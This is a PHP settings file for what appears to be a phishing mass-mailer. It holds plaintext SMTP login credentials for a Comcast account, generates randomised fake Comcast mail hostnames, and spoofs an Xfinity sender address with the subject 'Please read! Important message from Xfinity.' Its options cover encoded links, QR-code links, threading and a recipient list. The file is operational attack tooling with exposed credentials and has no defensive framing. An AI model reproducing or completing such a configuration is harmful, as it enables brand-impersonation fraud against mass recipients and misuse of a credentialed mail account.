<?php

// SMTP settings
$smtpSettings = [
    'smtp1' => [
        'host' => 'smtp.comcast.net',
        'port' => 587,
        'username' => 'zoefar101@comcast.net',
        'password' => 'qwerty@2',
        'Hostname'			=> "mail-".rand(1,9999)."sys.comcast.net",
    ],
    
  /*  'smtp2' => [
       'host' => 'smtp.comcast.net',
        'port' => 587,
        'username' => 'zoefar101@comcast.net',
        'password' => 'qwerty@2',
        'Hostname'			=> "mail-".rand(1,9999)."sys.cfinity.net",
    ],
    
        'smtp3' => [
            'host' => 'smtp.comcast.net',
            'port' => 587,
            'username' => 'zoefar101@comcast.net',
            'password' => 'qwerty',
            'Hostname'			=> "mail-".rand(1,9999)."sys.cfinity.net",
        ],
 */
    // Add more SMTP configurations as needed
];

$commonSettings = [
    'from'              => 'xfinity.communications@xfinity.comcast.net',    // Sender's email address
    'fromname'          => '',           // Sender's name
    'subject'           => 'Please read! Important message from Xfinity.', // Default email subject with placeholder
    'letterFile'        => '1.html',                   //  letter filename
    'priority'          => '3',                         // Priority 
    'encoding'          => 'quoted-printable',          // Encoding type
    'charset'           => 'hex',                    // Character set
    'threads'           => '3',                       // Number of threads
    'sleepDuration'     => '',                       // Sleep duration between sending emails
    'link'              => '',                         // Your link for muttple link sepperat with |
    'linkb64'           => '',                         // Base link link
    'qrlink'            => '',                         // Link behinde qrlink 
    'qrlabel'           => '',                         // Label below qr code
    'image_attachfile'  => '',                         // Image attachment filename
    'imageLetter'       => 'ff1.jpg',                   // Image to base64 or direct images sending
    'pdf_attachfile'    => '',                         // PDF file name to attach
    'autolink'          => false,                      // enable autolink in function
    'image_attachname'  => '',                         // CHnage attachment name
    'randomparam'       => false,                      // randomparam in front of link
    'encodeFromInfo'    => false,                       // Enable Base64 encoding for from name
    'encodeSubject'     => false,                       // Enable Base64 encoding for subject
    'randSender'        => true,                      // Enable Base64 encoding for sender's name
    'displayimage'      => false,   
    'recipientListFile' => 'list.txt',
    'ErrorHandling' => '2',  
    // Enable Base64 encoding for image display
    // other common settings...
];

$recipientListSettings = [
    'removeDuplicates' => false, // Remove duplicate recipients
    'recipientListFile' => 'list.txt', // Recipient list file
];


$customHeaderSettings = [
    
    'customHeaders' => [
        
  //      'Custom-Header1' => 'custom-value1',
  //      'Custom-Header2' => 'custom-value2',
        // ... add more customizable headers here
    ]
];

?>
